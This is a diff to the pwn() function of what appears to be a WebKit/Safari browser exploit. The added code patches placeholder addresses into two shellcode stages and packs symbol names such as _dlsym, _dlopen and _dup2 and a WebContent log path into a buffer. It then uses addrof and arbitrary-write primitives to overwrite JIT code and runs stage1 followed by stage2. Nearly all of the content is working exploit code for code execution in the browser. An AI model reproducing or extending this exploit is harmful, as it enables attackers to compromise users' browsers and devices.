@@ -372,8 +372,78 @@ function pwn() {
         return str;
     }
     log(`[*] hexdump(stage1): ${hexdump(stage1)}`);
+    
+    stage1.replace = function(oldVal, newVal) {
+        for (var idx = 0; idx < this.length; idx++) {
+            var found = true;
+            for (var j = idx; j < idx + 8; j++) {
+                if (this[j] != oldVal.byteAt(j - idx)) {
+                    found = false;
+                    break;
+                }
+            }
+            if (found)
+                break;
+        }
+        this.set(newVal.bytes(), idx);
+    };
+    
+    stage2.replace = function(oldVal, newVal) {
+        for (var idx = 0; idx < this.length; idx++) {
+            var found = true;
+            for (var j = idx; j < idx + 8; j++) {
+                if (this[j] != oldVal.byteAt(j - idx)) {
+                    found = false;
+                    break;
+                }
+            }
+            if (found)
+                break;
+        }
+        this.set(newVal.bytes(), idx);
+    };
+    
+    function writeStringToUint8Array(str, uint8Array, offset = 0) {
+        const encoder = new TextEncoder();
+        const encoded = encoder.encode(str);
+        const length = Math.min(encoded.length, uint8Array.length - offset);
+        for (let i = 0; i < length; i++) {
+            uint8Array[offset + i] = encoded[i];
+        }
+        if (offset + length < uint8Array.length) {
+            uint8Array[offset + length] = 0;
+        }
+    }
+
+    let ourArray = new Uint8Array(1024).fill(0x41);
+    let arrayObjectAddr = addrof(ourArray);
+    /*
+     ldr x0, =target  // x0 is the address of the JS object (arrayObjectAddr)
+     ldr x1, [x0, 16] // x1 is the address of the UInt8 array
+     ldr x2, [x1]     // read 8 bytes from the array into x2
+    */
+    
+    let stringsOff = 144; // after all addresses
+    writeStringToUint8Array("_sleep", ourArray, stringsOff + 0);
+    writeStringToUint8Array("_malloc", ourArray, stringsOff + 7);
+    writeStringToUint8Array("_dlsym", ourArray, stringsOff + 15);
+    writeStringToUint8Array("__platform_strcmp", ourArray, stringsOff + 22);
+    writeStringToUint8Array("__platform_strlen", ourArray, stringsOff + 40);
+    writeStringToUint8Array("_open", ourArray, stringsOff + 58);
+    writeStringToUint8Array("_getenv", ourArray, stringsOff + 64);
+    writeStringToUint8Array("_abort", ourArray, stringsOff + 72);
+    writeStringToUint8Array("_write", ourArray, stringsOff + 79);
+    writeStringToUint8Array("_dup2", ourArray, stringsOff + 86);
+    writeStringToUint8Array("_dlopen", ourArray, stringsOff + 92);
+    writeStringToUint8Array("HOME", ourArray, stringsOff + 100);
+    writeStringToUint8Array("/Library/Caches/com.apple.WebKit.WebContent/log.txt", ourArray, stringsOff + 105);
+    
+    stage1.replace(new Int64("0xbadbad10badbad10"), new Int64(arrayObjectAddr));
     ArbitraryWrite(JITCode, stage1);
-    log(`[*] Executing stage1`);
     shellcodeFunc();
-    log(`[*] Stage1 returned`);
+    millis(1000 * 5);
+    stage2.replace(new Int64("0xbadbad10badbad10"), new Int64(arrayObjectAddr));
+    ArbitraryWrite(JITCode, stage2);
+    shellcodeFunc();
+    
 }
